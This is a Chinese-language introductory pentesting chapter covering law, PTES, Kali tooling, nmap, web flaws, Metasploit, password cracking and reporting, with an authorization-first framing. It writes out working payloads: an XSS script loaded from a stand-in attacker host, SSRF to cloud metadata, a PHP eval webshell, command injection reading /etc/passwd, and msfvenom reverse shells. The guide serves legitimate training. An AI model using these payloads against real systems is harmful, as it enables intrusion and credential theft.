# 基础

> 渗透测试基础 = **法律边界 + 渗透方法论(PTES) + Kali/Parrot 工具栈 + 信息收集 + 端口扫描(nmap) + 漏扫(nuclei) + Web 基础(SQLi/XSS/SSRF) + 暴力破解(hydra) + Metasploit 入门 + Burp Suite + 报告写作**。本章面向初次接触安全测试的运维/开发工程师。

> ⚠️ **法律红线**: 未经授权的渗透测试 = 违法。**仅在授权范围 + 书面合同**。本章用于自有实验环境 / CTF / 授权测试。

## 一、法律与道德

```
中国法律:
  ☐ 网络安全法 (第27条): 未经授权侵入 = 违法
  ☐ 刑法 285/286 (非法侵入 / 破坏)
  ☐ 数据安全法 (重要数据)
  ☐ 个保法 (个人信息)

合法路径:
  ✅ 自有环境 + CTF (Hack The Box / TryHackMe)
  ✅ SRC (Security Response Center, 厂商众测)
  ✅ 授权渗透 (书面合同 + 范围 + 时间)
  ✅ 内部红队 (公司授权)
  ✅ 等保测评机构

红队规则:
  ☐ 范围 (IP / 域名 / 应用)
  ☐ 时间窗 (24x7 或 工作时间)
  ☐ 升级路径 (发现 0day 通报)
  ☐ 数据保护 (不外泄)
  ☐ 不破坏生产
  ☐ 日志留存 (法证)
```

## 二、PTES 七阶段

```
1. Pre-engagement   预交付 (范围 + 合同)
2. Intelligence     情报收集 (OSINT)
3. Threat Modeling  威胁建模
4. Vulnerability    漏洞分析
5. Exploitation     利用
6. Post-Exploitation 后渗透 (持久化 + 横向)
7. Reporting        报告
```

## 三、Kali / Parrot 工具栈

```
信息收集:
  nmap ⭐ / masscan / rustscan
  amass / subfinder (子域)
  theharvester / Maltego (OSINT)
  shodan / censys (互联网指纹)
  wafw00f (WAF 识别)

Web 扫描:
  Burp Suite ⭐ (代理 + 重放)
  OWASP ZAP
  nuclei ⭐ (现代 PoC)
  nikto (经典)
  whatweb / wappalyzer (指纹)
  dirsearch / gobuster / ffuf (目录爆破)
  sqlmap ⭐ (SQL 注入)
  XSStrike (XSS)
  
漏洞利用:
  Metasploit ⭐
  Exploit-DB / searchsploit
  Cobalt Strike (商业, 红队)
  Sliver (开源 C2)
  Empire / Covenant

密码破解:
  hydra / medusa (在线)
  john / hashcat ⭐ (离线)
  CrackMapExec ⭐ (内网)
  Responder (中间人)
  Mimikatz (Windows 凭证)

网络:
  Wireshark ⭐
  tcpdump
  Bettercap / Ettercap (中间人)
  aircrack-ng (WiFi)

后渗透:
  PowerSploit / Nishang (Windows)
  LinPEAS / WinPEAS ⭐ (提权枚举)
  BloodHound ⭐ (AD)
  
其他:
  exploitdb / msfconsole
  curl / wget
  python / golang 自写
```

## 四、信息收集 (OSINT)

```bash
# 子域名
amass enum -d example.com
subfinder -d example.com -all
assetfinder example.com
# 主动 (DNS 解析验证)
dnsx -l subdomains.txt -a -resp

# 端口
nmap -sS -p- -T4 example.com
masscan -p1-65535 example.com --rate=10000
rustscan -a example.com -- -sC -sV

# Web 指纹
whatweb https://example.com
wappalyzer-cli https://example.com
wafw00f https://example.com

# Google Hacking
site:example.com filetype:pdf
site:example.com inurl:admin
site:github.com "example.com" password

# Shodan / Censys
shodan search org:"Example Corp"
censys search "example.com"

# Email / 员工
theharvester -d example.com -b google
linkedin / 脉脉
```

## 五、Nmap 实战

```bash
# 主机发现
nmap -sn 192.168.1.0/24            # Ping sweep
nmap -PE -PP -PS21,22,23,25,80,443 -PA -PU 192.168.1.0/24

# 端口扫描
nmap -sS -p- -T4 target              # SYN 全端口
nmap -sV -sC -p 22,80,443 target     # 版本 + 默认脚本
nmap -A target                        # OS + 服务 + 脚本
nmap --script vuln target            # 漏洞脚本

# UDP (慢)
nmap -sU --top-ports 100 target

# 输出
nmap -oA scan target                 # All formats (xml/grepable/normal)
nmap -oX scan.xml target

# 隐蔽
nmap -f target                        # 分片
nmap -D RND:10 target                 # 诱饵 IP
nmap --source-port 53 target          # 伪源端口

# 防御 (你的视角)
☐ Fail2ban / 限速
☐ IDS (Suricata) 检测 SYN scan
☐ 蜜罐 + 黑名单
```

## 六、Web 漏洞实战

### 6.1 SQL 注入

```bash
# 手工
' OR '1'='1
' UNION SELECT 1,2,3-- -

# sqlmap
sqlmap -u "https://example.com/item?id=1" --dbs
sqlmap -u "https://example.com/item?id=1" --batch --risk=3 --level=5
sqlmap -u "https://example.com/login" --data="user=a&pass=b" --dbs
sqlmap -r request.txt --os-shell        # 拿 shell
```

### 6.2 XSS

```html
# 反射型
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# 存储型
"><script src=https://attacker/x.js></script>

# 工具
XSStrike -u "https://example.com/search?q=test"
```

### 6.3 SSRF

```
http://target/api?url=http://169.254.169.254/latest/meta-data/   # AWS
http://target/api?url=http://localhost:6379/                       # Redis
http://target/api?url=file:///etc/passwd                          # 本地文件
http://target/api?url=gopher://localhost:6379/_FLUSHALL            # gopher
```

### 6.4 文件上传

```
绕过:
  - 改后缀 .jpg.php / .php5 / .phtml / .pht
  - Content-Type 篡改
  - 大小写
  - %00 截断 (老版本 PHP)
  - .htaccess 上传

webshell:
  <?php @eval($_POST['cmd']);?>
  
连接:
  蚁剑 / 冰蝎 / 哥斯拉
```

### 6.5 命令注入

```
; ls
| whoami
&& cat /etc/passwd
`id`
$(uname -a)

# 工具
commix -u "https://example.com/exec?cmd=test"
```

## 七、Burp Suite 入门

```
配置:
  Proxy → Browser 走 127.0.0.1:8080
  CA 证书安装

模块:
  Proxy:        拦截 / 改包
  Repeater:     重放 ⭐
  Intruder:     爆破 + Fuzzing ⭐
  Decoder:      编解码
  Comparer:     diff
  Scanner:      自动 (商业版)
  Extender:     插件 (Logger++ / Turbo Intruder / J2EEScan)
  Collaborator: SSRF / Blind / OOB

实战流程:
  1. Proxy 拦截登录 → 改密码爆破 (Intruder)
  2. SQL 注入测试 (Repeater 试 payload)
  3. XSS Fuzz
  4. 越权 (改 user_id)
```

## 八、Metasploit 入门

```bash
msfconsole

# 搜索 exploit
msf > search type:exploit name:ms17_010

# 加载 + 配置
msf > use exploit/windows/smb/ms17_010_eternalblue
msf > set RHOSTS 192.168.1.10
msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf > set LHOST 192.168.1.5
msf > set LPORT 4444
msf > run

# meterpreter (拿到后)
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getsystem            # 提权
meterpreter > hashdump             # 抓 hash
meterpreter > shell                 # 切 cmd

# 生成 payload (msfvenom)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=1.2.3.4 LPORT=4444 -f exe -o shell.exe

# Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=1.2.3.4 LPORT=4444 -f elf -o shell.elf
```

## 九、密码破解

```bash
# 离线 (拿到 hash)
hashid hash.txt                       # 识别类型
john --wordlist=rockyou.txt hash.txt
hashcat -m 1800 hash.txt rockyou.txt  # -m mode

# 在线
hydra -l admin -P rockyou.txt 192.168.1.10 ssh
hydra -L users.txt -P pass.txt ftp://target
hydra -l admin -P pass.txt mysql://target
medusa -h target -u admin -P pass.txt -M ssh

# CrackMapExec (内网神器)
crackmapexec smb 192.168.1.0/24 -u admin -p pass
crackmapexec smb 192.168.1.0/24 -u admin -H ntlm_hash
crackmapexec winrm 192.168.1.10 -u admin -p pass -x "whoami"

# 防御
☐ Argon2id 强 hash
☐ MFA
☐ Fail2ban (5 次锁)
☐ 密码策略 (长 + 复杂 + 90d)
☐ 防 RDP / SSH 公网
```

## 十、内网枚举入门

```bash
# Linux 提权枚举
./LinPEAS.sh
./linenum.sh

# Windows 提权
WinPEAS.exe
PowerUp.ps1
Sherlock.ps1
Watson.exe

# AD (Active Directory)
BloodHound + SharpHound.exe
PowerView
ldapsearch / impacket

# Pivoting (跳板)
ssh -L 8080:internal:80 user@jumphost
chisel server / client
ligolo-ng ⭐ (现代)
```

## 十一、报告写作

```
结构:
  1. 摘要 (Executive Summary)
  2. 范围 + 方法
  3. 关键发现 (按风险等级)
  4. 漏洞详情 (重现步骤 / 证据 / 修复)
  5. 总体评估 + 建议
  6. 附录 (原始数据)

漏洞描述模板:
  - 标题
  - 风险等级 (Critical/High/Medium/Low + CVSS)
  - 受影响范围 (URL/IP)
  - 重现步骤 (截图)
  - 影响 (实际危害)
  - 修复建议 (具体)
  - 参考 (CVE/CWE/OWASP)

工具:
  Markdown + Pandoc → PDF
  Dradis (商业)
  PlexTrac (商业)
  自研 Jinja2 模板
```

## 十二、实验环境

```
CTF / 靶场:
  Hack The Box ⭐
  TryHackMe ⭐
  VulnHub
  PortSwigger Web Security Academy
  PentesterLab
  HackerOne CTF
  OverTheWire

国内:
  i 春秋
  攻防世界 (XCTF)
  墨者学院
  封神台

本地搭建:
  DVWA (Web 综合)
  Metasploitable 2/3
  vulnhub VM
  WebGoat
  bWAPP
```

## 十三、入门 20 题

```
1.  渗透授权三要素
2.  PTES 七阶段
3.  nmap SYN scan 原理
4.  SQL 注入 5 种 (Union/Boolean/Time/Error/OOB)
5.  XSS 三种 (反射/存储/DOM)
6.  CSRF 防御
7.  SSRF 危害
8.  webshell 工作原理
9.  Metasploit 5 步流程
10. Meterpreter 与 cmd 区别
11. hash 类型识别
12. NTLM Relay
13. PtH (Pass the Hash)
14. Burp Intruder 4 种 (Sniper/Battering/Pitchfork/Cluster)
15. Cobalt Strike / Sliver 用途
16. AD BloodHound 用途
17. CVE / CVSS 评分
18. OWASP Top 10 名称
19. 报告 5 大要素
20. CTF 平台 5 个
```

## 十四、推荐栈（基础）

```
信息收集:    nmap + amass + subfinder + shodan
Web 扫描:    Burp Suite ⭐ + nuclei + sqlmap + ffuf
漏洞利用:    Metasploit ⭐ + msfvenom
密码破解:    hashcat + hydra + CrackMapExec
后渗透:     LinPEAS / WinPEAS + BloodHound
内网:        chisel / ligolo-ng + impacket
报告:        Markdown + Pandoc
靶场:        HTB ⭐ + TryHackMe + DVWA
```

> 📖 **核心判断**：渗透测试基础 = **法律边界 + PTES 七阶段 + Kali 工具栈 + nmap/amass 信息 + Burp + sqlmap + Metasploit + hashcat/hydra + LinPEAS/BloodHound + CTF 练手 + 报告写作 + 20 题**。掌握这 10 条线，就具备渗透测试入门能力。**先合法, 再技术。**
